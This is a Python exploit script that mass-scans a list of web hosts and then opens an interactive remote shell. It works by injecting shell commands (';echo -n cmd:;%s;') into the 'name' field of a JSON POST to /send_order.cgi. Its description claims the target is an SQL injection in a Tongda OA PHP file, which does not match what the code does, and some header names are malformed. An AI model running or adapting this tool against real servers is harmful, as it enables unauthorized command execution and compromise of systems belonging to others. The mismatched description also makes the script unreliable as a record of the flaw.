import re

import requests,argparse,sys,time,os,json
from multiprocessing.dummy import Pool
from urllib.parse import urljoin,quote
requests.packages.urllib3.disable_warnings()

def main():
    banner()
    parser = argparse.ArgumentParser(description="通达OA report_bi.func.php 存在sql注入")
    parser.add_argument('-u','--url',help="please input your url")
    parser.add_argument('-f','--file',help="please input your file")
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

def banner():
    banner = '''
     __                            __                      __  __ 
    |  \                          |  \                    |  \|  \
    | $$____    ______    _______ | $$   __  __   __   __  \$$ \$$
    | $$    \  |      \  /       \| $$  /  \|  \ |  \ |  \|  \|  \
    | $$$$$$$\  \$$$$$$\|  $$$$$$$| $$_/  $$| $$ | $$ | $$| $$| $$
    | $$  | $$ /      $$| $$      | $$   $$ | $$ | $$ | $$| $$| $$
    | $$  | $$|  $$$$$$$| $$_____ | $$$$$$\ | $$_/ $$_/ $$| $$| $$
    | $$  | $$ \$$    $$ \$$     \| $$  \$$\ \$$   $$   $$| $$| $$
     \$$   \$$  \$$$$$$$  \$$$$$$$ \$$   \$$  \$$$$$\$$$$  \$$ \$$
                                                auther:lllo    
    '''
    print(banner)
def poc(target):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121',
        'Content - Type': 'application / x - www - form - urlencoded',
        'Pragma': 'no - cache',
        'Cache - Control': 'no - cache'
    }
    data='''{"opid":"1","name":";echo flag:102162387;","type":"rest"}'''
    url = target+'/send_order.cgi?parameter=operation'

    try:
        res = requests.post(url=url,headers=headers,data=data,timeout=5).text
        if "ok" in res:
            print(f"[+]{target} is veriable"+'\n')
            return True
        else:
            print(f'[-]{target} is not veriable')
            return  False
    except:
        print(f'[*]{target} server erro')
        return False

def exp(target):
    print("正在努力做shell")
    time.sleep(2)
    os.system("cls")
    while True:
        cmd = input("请输入你要执行的命令")
        if cmd == 'q':
            exit()
        headers = {
                "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
                "Content-Type": "application/x-www-form-urlencoded"
            }
        data = '''{"opid":"1","name":";echo -n cmd:;%s;","type":"rest"}'''%(cmd)
        url = target + '/send_order.cgi?parameter=operation'

        try:
            result = requests.post(url=url, data=data, verify=False, timeout=5, headers=headers,)
            response_sult = str(result.headers['cmd'])
            print(response_sult)


        except:
            pass


if __name__ =='__main__':
    main()
